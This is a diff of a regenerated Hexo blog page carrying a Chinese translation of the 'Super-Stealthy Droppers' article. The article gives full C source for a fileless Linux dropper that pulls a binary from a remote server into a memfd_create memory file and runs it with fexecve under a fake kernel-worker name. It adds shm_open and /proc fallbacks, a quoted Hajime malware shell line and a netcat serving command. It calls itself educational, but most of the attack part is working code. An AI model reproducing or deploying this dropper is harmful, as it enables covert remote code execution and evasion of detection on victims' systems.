@@ -6,10 +6,10 @@
 
 
 <html class="theme-next muse use-motion" lang="zh-Hans">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <script>
     (function(){
         if(''){
@@ -28,8 +28,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
 
 
 
@@ -47,7 +47,7 @@
 
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
 
 
 
@@ -81,23 +81,23 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
 
-<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
-
-
-  <meta name="keywords" content="M0rk,blog,security,hack,Hexo" />
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
 
 
-
-
-
-  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml" />
+  <meta name="keywords" content="M0rk,blog,security,hack,Hexo">
 
 
 
 
-  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1" />
+
+  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1">
 
 
 
@@ -105,12 +105,12 @@
 
 
 <meta name="description" content="1原文链接：&amp;lt;https://0x00sec.org/t/super-stealthy-droppers/3715&amp;gt; TL;DR 几周之前我看了这篇文章,介绍的是不使用ptrace来进行linux进程注入的(使用ptrace进行进程注入的文章可以看向这里linux进程注入)，这篇文章很有意思建议你读一下，但引起我关注是的文末的一句话 1The current payload in us">
-<meta name="keywords">
 <meta property="og:type" content="article">
 <meta property="og:title" content="linux一种无文件后门技巧(译文)">
 <meta property="og:url" content="http://kevien.github.io/2018/02/20/linux一种无文件后门技巧(译文)/index.html">
-<meta property="og:site_name" content="M0rk's Blog">
+<meta property="og:site_name" content="M0rk&#39;s Blog">
 <meta property="og:description" content="1原文链接：&amp;lt;https://0x00sec.org/t/super-stealthy-droppers/3715&amp;gt; TL;DR 几周之前我看了这篇文章,介绍的是不使用ptrace来进行linux进程注入的(使用ptrace进行进程注入的文章可以看向这里linux进程注入)，这篇文章很有意思建议你读一下，但引起我关注是的文末的一句话 1The current payload in us">
+<meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://kevien.github.io/2018/02/20/linux一种无文件后门技巧(译文)/xeye.png">
 <meta property="og:image" content="http://kevien.github.io/2018/02/20/linux一种无文件后门技巧(译文)/lsof.png">
 <meta property="og:updated_time" content="2019-01-09T08:56:03.098Z">
@@ -145,7 +145,7 @@
 
 
 
-  <link rel="canonical" href="http://kevien.github.io/2018/02/20/linux一种无文件后门技巧(译文)/"/>
+  <link rel="canonical" href="http://kevien.github.io/2018/02/20/linux一种无文件后门技巧(译文)/">
 
 
 
@@ -154,7 +154,7 @@
   <title>linux一种无文件后门技巧(译文) | M0rk's Blog</title>
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
   
 
@@ -179,13 +179,13 @@
   <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-wrapper">
   <div class="site-meta ">
     
 
     <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
+      <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">M0rk's Blog</span>
         <span class="logo-line-after"><i></i></span>
@@ -215,7 +215,7 @@
         <li class="menu-item menu-item-home">
           <a href="/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
             
             首页
           </a>
@@ -225,7 +225,7 @@
         <li class="menu-item menu-item-archives">
           <a href="/archives" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
             
             归档
           </a>
@@ -235,7 +235,7 @@
         <li class="menu-item menu-item-tags">
           <a href="/tags" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
             
             标签
           </a>
@@ -245,7 +245,7 @@
         <li class="menu-item menu-item-about">
           <a href="/about" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
             
             关于
           </a>
@@ -255,7 +255,7 @@
         <li class="menu-item menu-item-sitemap">
           <a href="/sitemap.xml" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
             
             站点地图
           </a>
@@ -268,7 +268,7 @@
             <a href="javascript:;" class="popup-trigger">
           
             
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
             
             搜索
           </a>
@@ -289,9 +289,7 @@
       <i class="fa fa-times-circle"></i>
     </span>
     <div class="local-search-input-wrapper">
-      <input autocapitalize="off" autocomplete="off" autocorrect="off"
-             placeholder="搜索..." spellcheck="false"
-             type="text" id="local-search-input">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
     </div>
   </div>
   <div id="local-search-result"></div>
@@ -323,16 +321,16 @@
   
   
 
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2018/02/20/linux一种无文件后门技巧(译文)/">
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="M0rk">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="/uploads/avatar.jpg">
     </span>
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="M0rk's Blog">
     </span>
 
@@ -426,37 +424,37 @@
       
 
       
-        <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">原文链接：&lt;https://0x00sec.org/t/super-stealthy-droppers/3715&gt;</div></pre></td></tr></table></figure>
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原文链接：&lt;https://0x00sec.org/t/super-stealthy-droppers/3715&gt;</span><br></pre></td></tr></table></figure>
 <h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
-<li><p>几周之前我看了这篇<a href="https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html" target="_blank" rel="external">文章</a>,介绍的是不使用ptrace来进行linux进程注入的(使用ptrace进行进程注入的文章可以看向这里<a href="https://kevien.github.io/2018/01/28/linux进程注入/">linux进程注入</a>)，这篇文章很有意思建议你读一下，但引起我关注是的文末的一句话</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">The current payload in use is a simple open/memfd_create/sendfile/fexecve program</div></pre></td></tr></table></figure>
+<li><p>几周之前我看了这篇<a href="https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html" target="_blank" rel="noopener">文章</a>,介绍的是不使用ptrace来进行linux进程注入的(使用ptrace进行进程注入的文章可以看向这里<a href="https://kevien.github.io/2018/01/28/linux进程注入/">linux进程注入</a>)，这篇文章很有意思建议你读一下，但引起我关注是的文末的一句话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The current payload in use is a simple open/memfd_create/sendfile/fexecve program</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>我之前没有听过memfd_create和fexecve…就是这里引发了我的好奇，我决定学习和研究一下。</p>
 </li>
 <li>这篇文章我们将要讨论一下怎么利用这两个函数来开发一个超级隐蔽的dropper，你可以认为这是一个恶意软件开发的教程，但是开发和发布恶意软件是违法的：），此文仅做教学使用，因为最终恶意软件分析师需要去了解恶意软件开发者是怎么利用的，好让我们能更好的去检测它，从而使我们系统更加的安全。<h4 id="memfd-create-和-fexecve"><a href="#memfd-create-和-fexecve" class="headerlink" title="memfd_create 和 fexecve"></a>memfd_create 和 fexecve</h4></li>
-<li>当读完这句有意思的话之后，我google了这两个函数，我发现功能确实强大，第一个允许我们在内存中创建一个文件，我们之前讨论过这个<a href="https://0x00sec.org/t/running-binaries-without-leaving-tracks/2166" target="_blank" rel="external">话题</a>,之前我们是使用/dev/shm来存放的文件，这个文件夹存放在内存中，我们写在这里的东西都不会保存到硬盘上，然而，我们还是可以通过ls看到它。</li>
+<li>当读完这句有意思的话之后，我google了这两个函数，我发现功能确实强大，第一个允许我们在内存中创建一个文件，我们之前讨论过这个<a href="https://0x00sec.org/t/running-binaries-without-leaving-tracks/2166" target="_blank" rel="noopener">话题</a>,之前我们是使用/dev/shm来存放的文件，这个文件夹存放在内存中，我们写在这里的东西都不会保存到硬盘上，然而，我们还是可以通过ls看到它。</li>
 <li>memfd_create 能做同样的事情，但是它在内存中的存储并不会被映射到文件系统中，因此不能简单的通过ls命令进行查看。</li>
 <li>第二个函数，fexecve同样的功能很强大，它能使我们执行一个程序（同execve），但是传递给这个函数的是文件描述符，而不是文件的绝对路径，也就是说搭配起来memfd_create使用简直完美！</li>
 <li>但是这里有一个需要注意的地方就是，因为这两个函数相对的比较新，memfd_create 是在kernel3.17才被引进来，fexecve是libc的一个函数，是在版本2.3.2之后才有的，当然没有fexecve的时候，我们也可以使用其它方式去取代它（后面会讨论），而memfd_create只能用在相对较新的linux内核系统上。</li>
 <li>这意味着至少在现在，这个技巧在一些运行着老内核和没有libc的嵌入式设备上是不可行的，我没有测试一些路由器和安卓设备上是否存在fexecve函数，我觉得是没有的，如有人知道，请在评论处告知；）<h4 id="一个简单的dropper"><a href="#一个简单的dropper" class="headerlink" title="一个简单的dropper"></a>一个简单的dropper</h4></li>
 <li>为了了解这两个函数是怎么工作的，我写了一个简单的dropper，这个dropper可以下载远程服务器上的二进制文件并且直接在内存中运行，不会存储在磁盘上。</li>
-<li>在这之前，我们先来看看之前文章中讨论过的<a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966" target="_blank" rel="external">Hajime</a>这个例子,这个例子使用了一行shell命令来创建一个文件（‘继承‘了另外一个文件的可执行权限）并且执行它然后再删除它。如果你不想打开链接，我之前把这行shell搬过来<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp .s .i; &gt;.i; ./.s&gt;.i; ./.i; rm .s; /bin/busybox ECCHI</div></pre></td></tr></table></figure>
+<li>在这之前，我们先来看看之前文章中讨论过的<a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966" target="_blank" rel="noopener">Hajime</a>这个例子,这个例子使用了一行shell命令来创建一个文件（‘继承‘了另外一个文件的可执行权限）并且执行它然后再删除它。如果你不想打开链接，我之前把这行shell搬过来<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp .s .i; &gt;.i; ./.s&gt;.i; ./.i; rm .s; /bin/busybox ECCHI</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <p>我们将要创建一个新的.s,一旦执行，将会达到执行类型上面一行shell同样的效果。</p>
 <ul>
 <li><p>让我们先来看一下这个代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">#include &lt;sys/syscall.h&gt;</div><div class="line"></div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/socket.h&gt;</div><div class="line">#include &lt;arpa/inet.h&gt;</div><div class="line"></div><div class="line">#define __NR_memfd_create 319</div><div class="line">#define MFD_CLOEXEC 1</div><div class="line"></div><div class="line">static inline int memfd_create(const char *name, unsigned int flags) &#123;</div><div class="line">    return syscall(__NR_memfd_create, name, flags);</div><div class="line">&#125;</div><div class="line"></div><div class="line">extern char        **environ;</div><div class="line"></div><div class="line">int main (int argc, char **argv) &#123;</div><div class="line">  int                fd, s;</div><div class="line">  unsigned long      addr = 0x0100007f11110002;</div><div class="line">  char               *args[2]= &#123;&quot;[kworker/u!0]&quot;, NULL&#125;;</div><div class="line">  char               buf[1024];</div><div class="line"></div><div class="line">  // Connect</div><div class="line">  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0) exit (1);</div><div class="line">  if (connect (s, (struct sockaddr*)&amp;addr, 16) &lt; 0) exit (1);</div><div class="line">  if ((fd = memfd_create(&quot;a&quot;, MFD_CLOEXEC)) &lt; 0) exit (1);</div><div class="line"></div><div class="line">  while (1) &#123;</div><div class="line">      if ((read (s, buf, 1024) ) &lt;= 0) break;</div><div class="line">      write (fd, buf, 1024);</div><div class="line">    &#125;</div><div class="line">  close (s);</div><div class="line">  </div><div class="line">  if (fexecve (fd, args, environ) &lt; 0) exit (1);</div><div class="line"></div><div class="line">  return 0;</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line"></span><br><span class="line">#define __NR_memfd_create 319</span><br><span class="line">#define MFD_CLOEXEC 1</span><br><span class="line"></span><br><span class="line">static inline int memfd_create(const char *name, unsigned int flags) &#123;</span><br><span class="line">    return syscall(__NR_memfd_create, name, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern char        **environ;</span><br><span class="line"></span><br><span class="line">int main (int argc, char **argv) &#123;</span><br><span class="line">  int                fd, s;</span><br><span class="line">  unsigned long      addr = 0x0100007f11110002;</span><br><span class="line">  char               *args[2]= &#123;&quot;[kworker/u!0]&quot;, NULL&#125;;</span><br><span class="line">  char               buf[1024];</span><br><span class="line"></span><br><span class="line">  // Connect</span><br><span class="line">  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0) exit (1);</span><br><span class="line">  if (connect (s, (struct sockaddr*)&amp;addr, 16) &lt; 0) exit (1);</span><br><span class="line">  if ((fd = memfd_create(&quot;a&quot;, MFD_CLOEXEC)) &lt; 0) exit (1);</span><br><span class="line"></span><br><span class="line">  while (1) &#123;</span><br><span class="line">      if ((read (s, buf, 1024) ) &lt;= 0) break;</span><br><span class="line">      write (fd, buf, 1024);</span><br><span class="line">    &#125;</span><br><span class="line">  close (s);</span><br><span class="line">  </span><br><span class="line">  if (fexecve (fd, args, environ) &lt; 0) exit (1);</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>代码很短也很简单，但是这里有几个点需要稍微介绍一下。</p>
 <h4 id="调用memfd-create"><a href="#调用memfd-create" class="headerlink" title="调用memfd_create"></a>调用memfd_create</h4></li>
-<li>第一个要介绍的就是，libc并没有对memfd_create这个系统调用进行封装（你可以在这里看到这个系统调用的相关信息<a href="http://man7.org/linux/man-pages/man2/memfd_create.2.html#NOTES" target="_blank" rel="external">memfd_create manpage’s NOTES section</a>）,这就意味着我们需要自己去封装一下。</li>
+<li>第一个要介绍的就是，libc并没有对memfd_create这个系统调用进行封装（你可以在这里看到这个系统调用的相关信息<a href="http://man7.org/linux/man-pages/man2/memfd_create.2.html#NOTES" target="_blank" rel="noopener">memfd_create manpage’s NOTES section</a>）,这就意味着我们需要自己去封装一下。</li>
 <li>首先我们需要找到memfd_create在系统调用中的索引，通过一些在线的系统调用表，这个索引在不同的架构下是不同的，如果你想将上面的代码应用在ARM和MIPS上,可能需要不同的索引，在X86_64系统架构下的索引是319.</li>
 <li>我使用了libc的syscall去对memfd_create进行了简单封装。</li>
 <li>这个程序主要做了下面的事情</li>
 <li>1.创建了一个TCP socket</li>
 <li><p>2，使用AF_INET连接了127.0.0.1的0x1111端口，我们可以把这些所有的打包到一个变量里面这样可以使我们的代码看起来更短一点儿，同样你也可以去修改成你想要的ip和端口。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">addr = 01 00 00  7f   1111  0002;</div><div class="line">        1. 0. 0.127   1111  0002;</div><div class="line">       +------------+------+----</div><div class="line">         IP Address | Port | Family</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">addr = 01 00 00  7f   1111  0002;</span><br><span class="line">        1. 0. 0.127   1111  0002;</span><br><span class="line">       +------------+------+----</span><br><span class="line">         IP Address | Port | Family</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>3.创建一个内存文件</p>
 </li>
@@ -465,12 +463,12 @@
 <li>是不是很简单粗暴；）<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4></li>
 <li>现在，让我们来测试一下，通过main函数里面那个long的变量我们知道，这个dropper将会去连接本地localhost(127.0.0.1)的0x1111端口，这里我们简单的使用nc模拟一个server。</li>
 <li><p>在控制台我们运行下面的命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ cat /usr/bin/xeyes | nc -l $((0x1111))</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat /usr/bin/xeyes | nc -l $((0x1111))</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>你可以选择任意你喜欢的二进制文件，我这里用的是xeyes（一个小眼睛会跟踪鼠标的移动）这个linux自带的小程序。在另外的一个命令行界面我们运行我们的dropper，这个时候xeyes会弹出来。<br><img src="/2018/02/20/linux一种无文件后门技巧(译文)/xeye.png" alt=""></p>
 <h4 id="检测这个dropper"><a href="#检测这个dropper" class="headerlink" title="检测这个dropper"></a>检测这个dropper</h4></li>
 <li><p>查找这个进程比较困难，因为我们给这个进程起了一个kworker/u!0这样的名字，注意！在这里只是为了快速的去发现它，当然在实际情况中，你可以使用一个具有迷惑性的名字，比如说什么so的进程名来让它看起来像是个内核的合法进程，让我们来看一下ps的输出</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ ps axe</div><div class="line">(...)</div><div class="line"> 2126 ?        S      0:00 [kworker/0:0]</div><div class="line"> 2214 pts/0    S+     0:00 [kworker/u!0]</div><div class="line">(...)</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ps axe</span><br><span class="line">(...)</span><br><span class="line"> 2126 ?        S      0:00 [kworker/0:0]</span><br><span class="line"> 2214 pts/0    S+     0:00 [kworker/u!0]</span><br><span class="line">(...)</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>你可以看到上面的一行中是一个合法的kworker进程，下面的就是我们的看似合法的进程。</p>
 <h4 id="看不见的文件"><a href="#看不见的文件" class="headerlink" title="看不见的文件"></a>看不见的文件</h4></li>
@@ -481,24 +479,24 @@
 <li>我们最好的方式是使用shm_open(shared memory open)，这个函数会在/dev/shm文件夹下创建文件，然而，这个使用ls命令是可以看的到的，但是至少还是避免了写文件到磁盘了，shm_open和open的区别仅仅是不是在/dev/shm创建文件。</li>
 <li>使用shm_open去修改这个dropper我们需要去做两件事情</li>
 <li><p>1.首先我们需要去使用shm_open去代替memfd_create像是这样</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(...)</div><div class="line">if ((fd = shm_open(&quot;a&quot;, O_RDWR | O_CREAT, S_IRWXU)) &lt; 0) exit (1);</div><div class="line">(...)</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(...)</span><br><span class="line">if ((fd = shm_open(&quot;a&quot;, O_RDWR | O_CREAT, S_IRWXU)) &lt; 0) exit (1);</span><br><span class="line">(...)</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>2.第二件事情就是我们需要关闭这个文件，然后去重新打开是为了能够通过fexecve去执行它，所以在while接收完文件之后我们需要关闭文件，然后重启新开文件：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">(...)</div><div class="line">  close (fd);</div><div class="line"></div><div class="line">  if ((fd = shm_open(&quot;a&quot;, O_RDONLY, 0)) &lt; 0) exit (1);</div><div class="line">(...)</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(...)</span><br><span class="line">  close (fd);</span><br><span class="line"></span><br><span class="line">  if ((fd = shm_open(&quot;a&quot;, O_RDONLY, 0)) &lt; 0) exit (1);</span><br><span class="line">(...)</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>这个时候我们完全可以使用execve去替代fexecve去达到同样的效果。</p>
 <h4 id="那如果fexecve不存在呢"><a href="#那如果fexecve不存在呢" class="headerlink" title="那如果fexecve不存在呢"></a>那如果fexecve不存在呢</h4></li>
 <li><p>当你知道fexecve是怎么工作的，这个就很简单，怎么去知道这个函数是怎么工作的，google一下看看源代码，man page有一个提示：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">NOTES</div><div class="line">On Linux, fexecve() is implemented using the proc(5) file system, so /proc needs to be mounted and available at the time of the call.</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NOTES</span><br><span class="line">On Linux, fexecve() is implemented using the proc(5) file system, so /proc needs to be mounted and available at the time of the call.</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>所以fexecve需要系统存在/proc的目录。让我们看看能不能自己实现一下。我们知道每个进程在虚拟目录proc下都有一个数字文件目录与之相对，所以这个时候，我们可以基本上使用下面的封装函数来实现fexecve的功能：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">int</div><div class="line">my_fexecve (int fd, char **arg, char **env) &#123;</div><div class="line">  char  fname[1024];</div><div class="line"></div><div class="line">  snprintf (fname, 1024, &quot;/proc/%d/fd/%d&quot;, getpid(), fd);</div><div class="line">  execve (fname, arg, env);</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">my_fexecve (int fd, char **arg, char **env) &#123;</span><br><span class="line">  char  fname[1024];</span><br><span class="line"></span><br><span class="line">  snprintf (fname, 1024, &quot;/proc/%d/fd/%d&quot;, getpid(), fd);</span><br><span class="line">  execve (fname, arg, env);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul>
 <li>读完这篇文章，你应该了解了之前提到的open/memfdcreate/sendfile/fexecve这几个函数。</li>
 <li>这篇文章中作者是以打开xeye程序为示例，那么你有其它猥琐的利用场景吗 ；P<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
-<li><a href="https://0x00sec.org/t/super-stealthy-droppers/3715" target="_blank" rel="external">Super-Stealthy Droppers</a></li>
+<li><a href="https://0x00sec.org/t/super-stealthy-droppers/3715" target="_blank" rel="noopener">Super-Stealthy Droppers</a></li>
 </ul>
 
       
@@ -536,8 +534,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/02/26/通过return-to-libc绕过NX-bit/" rel="next" title="通过return-to-libc绕过NX-bit">
-                <i class="fa fa-chevron-left"></i> 通过return-to-libc绕过NX-bit
+              <a href="/2018/01/30/reverse-shell的几种方式/" rel="next" title="reverse shell的几种方式">
+                <i class="fa fa-chevron-left"></i> reverse shell的几种方式
               </a>
             
           </div>
@@ -546,8 +544,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/01/30/reverse-shell的几种方式/" rel="prev" title="reverse shell的几种方式">
-                reverse shell的几种方式 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/02/26/通过return-to-libc绕过NX-bit/" rel="prev" title="通过return-to-libc绕过NX-bit">
+                通过return-to-libc绕过NX-bit <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -596,7 +594,7 @@
 
       
         <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
             文章目录
           </li>
           <li class="sidebar-nav-overview" data-target="site-overview">
@@ -606,10 +604,8 @@
       
 
       <section class="site-overview sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image"
-               src="/uploads/avatar.jpg"
-               alt="M0rk" />
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/uploads/avatar.jpg" alt="M0rk">
           <p class="site-author-name" itemprop="name">M0rk</p>
            
               <p class="site-description motion-element" itemprop="description"></p>
@@ -736,7 +732,7 @@
